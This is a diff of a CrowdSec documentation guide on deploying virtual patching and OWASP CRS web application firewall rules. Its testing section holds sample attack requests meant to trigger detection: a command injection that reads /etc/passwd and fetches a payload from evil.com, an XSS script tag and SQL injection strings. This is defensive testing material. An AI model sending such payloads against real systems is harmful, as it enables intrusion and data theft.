@@ -18,11 +18,11 @@ This guide shows how to deploy both CrowdSec's virtual patching rules and OWASP 
 
 Install both the virtual patching and CRS collections:
 
-```bash
-# Install virtual patching rules (in-band blocking)
+```bash title="Install virtual patching rules (in-band blocking)"
 cscli collections install crowdsecurity/appsec-virtual-patching
+```
 
-# Install OWASP CRS rules (out-of-band detection + scenario)
+```bash title="Install OWASP CRS rules (out-of-band detection + scenario)
 cscli collections install crowdsecurity/appsec-crs
 ```
 
@@ -83,29 +83,25 @@ The `crowdsecurity/appsec-crs` collection includes:
 
 Verify that both configurations are loaded:
 
-```bash
-# Check AppSec configurations
+```bash title="Check AppSec configurations"
 cscli appsec-configs list
-
-# Should show:
-# crowdsecurity/appsec-default
-# crowdsecurity/crs
-
-# Check scenarios
-cscli scenarios list | grep appsec
-
-# Should show:
-# crowdsecurity/crowdsec-appsec-outofband
 ```
+Should show:
+- crowdsecurity/appsec-default
+- crowdsecurity/crs
+
+```bash title="Check scenarios"
+cscli scenarios list | grep appsec
+```
+Should show:
+- crowdsecurity/crowdsec-appsec-outofband
 
 ### Check AppSec Status
 
-```bash
-# Check that AppSec is running
+```bash title="Check that AppSec is running"
 cscli metrics
-
-# Look for appsec metrics in the output
 ```
+*Look for appsec metrics in the output*
 
 ## Testing - CrowdSec Vpatch
 
@@ -119,6 +115,11 @@ curl -I ${TARGET}'/.env'
 
 ## Testing - OWASP CRS
 
+:::warning
+Those requests are meant to emulate malevolent requests that will be catched by OWASP CRS.  
+Don't lock yourself out if CrowdSec or any other security rule processor applies a ban uppon the following:
+:::
+
 ```bash
 TARGET=localhost
 curl -I  ${TARGET}'/?x=A";cat+/etc/passwd;wget+http://evil.com/payload'
@@ -128,10 +129,6 @@ curl -I  ${TARGET}'/?x=A"<script>alert(1)</script>'
 curl -I  ${TARGET}'/?x=A"+OR+"1"="1"+union+select+"fooobar","foo'
 curl -I  ${TARGET}'/?x=A"+OR+"1"="1"+union+select+"fooobar","foo'
 ```
-
-:::warning
-Those requests are meant to emulate malevolent requests that will be catched by OWASP CRS.
-:::
 
 Uppon triggering those, you should see in CrowdSec logs:
 
